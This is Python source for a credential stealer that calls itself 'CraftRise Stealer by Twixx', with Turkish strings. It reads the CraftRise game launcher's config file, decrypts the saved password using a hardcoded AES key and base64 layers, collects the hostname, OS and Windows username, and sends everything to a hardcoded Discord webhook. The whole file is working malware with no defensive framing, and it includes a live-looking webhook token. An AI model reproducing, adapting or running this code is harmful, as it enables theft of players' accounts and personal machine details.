import os
import sys
import base64
import json
import socket
import platform
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1404826071857365175/_nnsrkDs3mqHh0SnYorSGY_lkRhFaxpXRwHUqAi0W7sPO6XzGgXDUibCz3XHAmYo76dx"

def decrypt_base64(encoded_str):
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        return decoded_bytes.decode('utf-8')
    except Exception as e:
        return encoded_str

def decrypt_rise_version(s):
    try:
        s1 = decrypt_base64(s)
        s2 = decrypt_base64(s1)
        
        prefix = "3ebi2mclmAM7Ao2"
        suffix = "KweGTngiZOOj9d6"
        
        if not (s2.startswith(prefix) and s2.endswith(suffix)):
            return s2
            
        substring = s2[len(prefix):len(s2)-len(suffix)]
        final = decrypt_base64(substring)
        
        return final
    except Exception as e:
        return s

def decrypt_aes(encrypted_base64):
    try:
        key = "2640023187059250".encode('utf-8')
        encrypted_data = base64.b64decode(encrypted_base64)
        cipher = AES.new(key, AES.MODE_ECB)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted_data.decode('utf-8')
    except Exception as e:
        return ""

def decrypt_password(encrypted_pass):
    try:
        decrypted_aes = decrypt_aes(encrypted_pass)
        
        if not decrypted_aes:
            return ""
        
        result = decrypt_rise_version(decrypted_aes)
        
        if '#' in result:
            return result.split('#')[0]
        
        return result
    except Exception as e:
        return ""

def get_system_info():
    try:
        return {
            "hostname": socket.gethostname(),
            "os": platform.system() + " " + platform.release(),
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": os.getlogin(),
            "computer_name": platform.node()
        }
    except Exception as e:
        return {
            "error": str(e),
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

def read_craftrise_config():
    result = {
        "success": False,
        "error": None,
        "config_found": False,
        "data": {}
    }
    
    try:
        appdata_path = os.getenv('APPDATA')
        config_path = os.path.join(appdata_path, '.craftrise', 'config.json')
        
        if not os.path.exists(config_path):
            result["error"] = f"Config dosyası bulunamadı: {config_path}"
            return result
        
        result["config_found"] = True
        
        with open(config_path, 'r', encoding='utf-8') as f:
            config_data = json.load(f)
        
        result["data"]["username"] = config_data.get('rememberName', '')
        result["data"]["encrypted_password"] = config_data.get('rememberPass', '')
        result["data"]["version"] = config_data.get('version', '')
        result["data"]["client_ram"] = config_data.get('clientRam', '')
        result["data"]["windows_type"] = config_data.get('windowsType', '')
        result["data"]["display"] = config_data.get('display', '')
        result["data"]["is_optimized_config"] = config_data.get('isOptimizedConfig', False)
        
        if result["data"]["encrypted_password"]:
            result["data"]["decrypted_password"] = decrypt_password(
                result["data"]["encrypted_password"]
            )
            result["success"] = True
        else:
            result["error"] = "Şifrelenmiş şifre bulunamadı"
        
        return result
    
    except Exception as e:
        result["error"] = f"Config okuma hatası: {str(e)}"
        return result

def send_webhook(webhook_url, data):
    try:
        system_info = get_system_info()
        
        if data["success"] and data["config_found"]:
            config = data["data"]
            
            embed = {
                "title": "CraftRise Hesap Bilgileri",
                "color": 0x00ff00,
                "image": {
                    "url": "https://cdn.discordapp.com/banners/1205473233680343040/a_942183765b77874e60790f96637758e5.gif?size=480"
                },
                "fields": [
                    {
                        "name": "Kullanıcı Adı",
                        "value": f"`{config['username'] or 'Bulunamadı'}`",
                        "inline": True
                    },
                    {
                        "name": "Şifre",
                        "value": f"`{config['decrypted_password'] or 'Bulunamadı'}`",
                        "inline": True
                    },
                    {
                        "name": "Sürüm",
                        "value": f"`{config['version'] or 'Bulunamadı'}`",
                        "inline": True
                    },
                    {
                        "name": "RAM",
                        "value": f"`{config['client_ram'] or 'Bulunamadı'}`",
                        "inline": True
                    },
                    {
                        "name": "İşletim Sistemi",
                        "value": f"`{system_info['os']}`",
                        "inline": True
                    },
                    {
                        "name": "Bilgisayar Adı",
                        "value": f"`{system_info['computer_name']}`",
                        "inline": True
                    },
                    {
                        "name": "Kullanıcı",
                        "value": f"`{system_info['username']}`",
                        "inline": True
                    },
                    {
                        "name": "Tarih",
                        "value": f"`{system_info['date']}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "CraftRise Stealer by Twixx"
                }
            }
            
            extra_fields = []
            if config.get("display"):
                extra_fields.append({
                    "name": "Ekran",
                    "value": f"`{config['display']}`",
                    "inline": True
                })
            
            if "is_optimized_config" in config:
                extra_fields.append({
                    "name": "Optimize Edilmiş",
                    "value": f"`{'Evet' if config['is_optimized_config'] else 'Hayır'}`",
                    "inline": True
                })
                
            if extra_fields:
                embed["fields"].extend(extra_fields)
            
            payload = {
                "username": "CraftRise Stealer",
                "avatar_url": "https://cdn.discordapp.com/avatars/1205473233680343040/de3bf6523368126e6947a31afac0428b.png",
                "content": "**Yeni CraftRise hesabı bulundu!**",
                "embeds": [embed]
            }
            
            response = requests.post(webhook_url, json=payload)
            
            if response.status_code == 204:
                return True
            else:
                return False
        else:
            embed = {
                "title": "CraftRise Bilgileri Alınamadı",
                "color": 0xff0000,
                "description": data["error"] or "Bilinmeyen bir hata oluştu",
                "image": {
                    "url": "https://cdn.discordapp.com/banners/1205473233680343040/a_942183765b77874e60790f96637758e5.gif?size=480"
                },
                "fields": [
                    {
                        "name": "İşletim Sistemi",
                        "value": f"`{system_info['os']}`",
                        "inline": True
                    },
                    {
                        "name": "Bilgisayar Adı",
                        "value": f"`{system_info['computer_name']}`",
                        "inline": True
                    },
                    {
                        "name": "Tarih",
                        "value": f"`{system_info['date']}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "CraftRise Stealer - Hata"
                }
            }
            
            payload = {
                "username": "CraftRise Stealer",
                "avatar_url": "https://cdn.discordapp.com/avatars/1205473233680343040/de3bf6523368126e6947a31afac0428b.png",
                "content": "**CraftRise bilgileri alınamadı**",
                "embeds": [embed]
            }
            
            response = requests.post(webhook_url, json=payload)
            
            if response.status_code == 204:
                return True
            else:
                return False
    
    except Exception as e:
        return False

def main():
    try:
        config_data = read_craftrise_config()
        
        if config_data["success"]:
            if WEBHOOK_URL:
                send_webhook(WEBHOOK_URL, config_data)
        else:
            if WEBHOOK_URL:
                send_webhook(WEBHOOK_URL, config_data)
    except Exception as e:
        print(f"Hata: {str(e)}")

if __name__ == "__main__":
    main()
